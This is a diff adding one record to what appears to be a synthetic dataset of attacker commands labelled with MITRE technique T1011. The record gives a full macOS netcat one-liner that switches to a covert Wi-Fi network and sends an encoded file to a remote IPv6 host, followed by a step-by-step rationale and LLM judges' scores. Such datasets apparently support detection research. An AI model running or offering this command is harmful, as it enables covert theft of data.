@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"svc-backhaul-165\" \"d3c0y-165!\" && tar -czf - /Users/Shared/exports/report.csv | base64 | nc -6 fe80::2c3d:4e5f:6a7b:8c9d%en0 55991 -w 3 -N",
+  "explanation": "Exfiltrates a specific file over an alternate Wi‑Fi medium by disconnecting from any current Wi‑Fi, joining a covert 5 GHz SSID, base64-encoding the data, and sending it via IPv6 link-local to a high, uncommon port. This aligns with T1011 by shifting data transfer to a separate wireless medium from the presumed primary channel.",
+  "rationale_steps": [
+    "Disassociate from any current Wi‑Fi to avoid using the primary network.",
+    "Join a covert 5 GHz SSID acting as the alternate network medium.",
+    "Archive and base64-encode the target file to reduce inspection visibility.",
+    "Send the encoded data to an IPv6 link-local address scoped to en0 on a high, nonstandard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-9cd50333",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, correct chaining (&& and pipes), valid options for airport/networksetup/tar/base64/nc, and proper IPv6 link-local zone syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects from current Wi-Fi, joins an alternate SSID, and streams the specified file via base64 over IPv6 netcat to a link-local target (aligning with T1011), but it assumes sudo availability and specific interface/address conditions that may not always hold.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T22:56:09.969616Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, tar, base64, nc), and follows correct syntax for each component.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by disconnecting from current Wi-Fi, connecting to an alternate network, compressing a specific file, encoding it with base64, and exfiltrating it over IPv6 to a specific port using netcat.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-09-30T22:56:30.424474Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and no impossible constructs.",
+        "semantic_score": 3,
+        "semantic_justification": "While the chosen tools and overall flow align with the intent, the `networksetup -setairportnetwork` command lacks `sudo` and would likely fail due to insufficient permissions, preventing the crucial step of joining the alternate Wi-Fi network and thereby breaking the exfiltration chain as described.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-09-30T22:56:54.094057Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
